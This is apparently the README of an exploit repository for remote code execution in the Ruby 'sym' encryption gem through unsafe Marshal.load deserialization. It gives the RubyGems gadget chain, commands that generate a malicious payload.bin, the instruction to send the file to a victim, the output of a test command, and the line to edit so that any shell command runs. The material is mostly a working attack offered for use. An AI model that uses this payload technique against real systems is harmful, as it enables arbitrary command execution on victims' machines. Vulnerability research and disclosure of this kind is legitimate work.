# Sym RCE: Ruby Deserialization Exploit

Remote code execution via unsafe `Marshal.load()` in the [sym](https://github.com/kigster/sym) encryption gem.

## Summary

| Property | Value |
|----------|-------|
| Vulnerability | Insecure Deserialization (CWE-502) |
| Target | sym gem (Ruby encryption utility) |
| Impact | Arbitrary command execution |
| Auth Required | None |
| Attack Vector | Malicious encrypted file |

## Vulnerability

Sym uses `Marshal.load()` to deserialize data during decryption without validation:

```ruby
# lib/sym/data/decoder.rb:25
def initialize(data_encoded, compress)
  # ... base64 decode, decompress ...
  self.data = Marshal.load(data)  # Unsafe deserialization
end
```

Ruby's `Marshal.load()` instantiates arbitrary objects. Combined with RubyGems gadget classes present in any Ruby environment, this enables code execution during deserialization.

## Gadget Chain

```
Gem::Requirement
    └─> Gem::DependencyList (via marshal_dump override)
        └─> Gem::Source::SpecificFile (comparison triggers spec load)
            └─> Gem::StubSpecification (@loaded_from = "|cmd 1>&2")
                └─> Shell command executes
```

The `StubSpecification` class interprets `@loaded_from` paths starting with `|` as shell commands, executing them when the spec name is accessed.

## Usage

Generate payload:

```bash
ruby payload_generate.rb
```

Creates `payload.bin` with the serialized gadget chain (default: `id 1>&2`). The payload is not encrypted - deserialization occurs before decryption, so any key (or invalid key) works.

Send `payload.bin` to victim. Victim attempts to decrypt:

```bash
sym -k ~/.sym.key -d -f payload.bin
```

Output:

```
uid=501(user) gid=20(staff) groups=20(staff)...
```

## Customization

Edit `payload_generate.rb` to change the executed command:

```ruby
stub_specification.instance_variable_set(:@loaded_from, "|your_command_here 1>&2")
```

## Files

| File | Purpose |
|------|---------|
| `payload_generate.rb` | Generates serialized RCE payload |
| `demo.sh` | Local proof-of-concept |
